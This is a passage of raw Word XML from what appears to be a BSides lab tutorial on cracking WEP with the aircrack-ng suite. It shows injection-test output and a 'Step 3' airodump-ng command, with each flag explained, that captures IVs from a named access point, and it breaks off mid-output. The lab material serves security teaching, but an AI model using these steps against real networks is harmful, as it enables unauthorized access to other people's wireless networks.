      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>09:23:35  Injection</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> is working!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCC13D4" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>09:23:37  Found</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 AP </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23216916" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C925E4" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>09:23:37  Trying</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> directed probe requests...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BF7ECE" w14:textId="36907900" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>09:23:37  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> - channel: 9 - '</w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0" w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B70A304" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>09:23:39  Ping</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> (min/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>avg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>/max): 1.827ms/68.145ms/111.610ms Power: 33.73</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2AA5CD" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="0012143E"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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>09:23:39  30</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>/30: 100%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0F7618" w14:textId="77777777" w:rsidR="002E6DDC" w:rsidRPr="002E6DDC" w:rsidRDefault="002E6DDC" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B324AC9" w14:textId="77777777" w:rsidR="002E6DDC" w:rsidRDefault="002E6DDC" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="290446A7" w14:textId="76C702E9" w:rsidR="002E6DDC" w:rsidRPr="007F2182" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 3 - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture the IVs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49336BF1" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Open another console session to capture the generated IVs. Then enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536BF994" w14:textId="77777777" w:rsidR="002E6DDC" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C0E081" w14:textId="705286A4" w:rsidR="002B7D39" w:rsidRPr="002D638E" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w output </w:t>
      </w:r>
      <w:r w:rsidR="00E45DB9" w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24173EED" w14:textId="77777777" w:rsidR="002E6DDC" w:rsidRDefault="002E6DDC" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06719A8B" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F428CA1" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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c</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9 is the channel for the wireless network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4719D6ED" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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lastRenderedPageBreak/>
        <w:t>--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This eliminate</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> extraneous traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45572527" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> capture is file name prefix for the file which will contain the IVs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3927F4" w14:textId="076260FA" w:rsidR="002B7D39" w:rsidRDefault="00E45DB9" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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sidR="002B7D39">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the interface name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD5BDCD" w14:textId="77777777" w:rsidR="002E6DDC" w:rsidRDefault="002E6DDC" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64DF21AF" w14:textId="77777777" w:rsidR="002E6DDC" w:rsidRDefault="002E6DDC" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ABE8CDE" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="002E6DDC" w:rsidRDefault="002B7D39" w:rsidP="002B7D39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>While the injection is taking place (later), the screen will look similar to this:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2ED03B" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="002E6DDC"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2E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>CH  9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> ][ Elapsed: 8 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>mins</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> ][ 2007-03-21 19:25 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF72805" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="002E6DDC"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2E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC737AF" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="002E6DDC"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2E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> BSSID              PWR </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>RXQ  Beacons</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB015C2" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="002E6DDC"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2E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643F7D81" w14:textId="1E45061E" w:rsidR="002B7D39" w:rsidRPr="002E6DDC"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2E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   42 100     5240   178307  338   9  54  WEP  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>WEP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r w:rsidR="007E5CF0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72BEA962" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="002E6DDC"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2E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1775078B" w14:textId="77777777" w:rsidR="002B7D39" w:rsidRPr="002E6DDC"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2E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> BSSID              STATION            </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>PWR  Lost</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002E6DDC">
        <w:rPr>
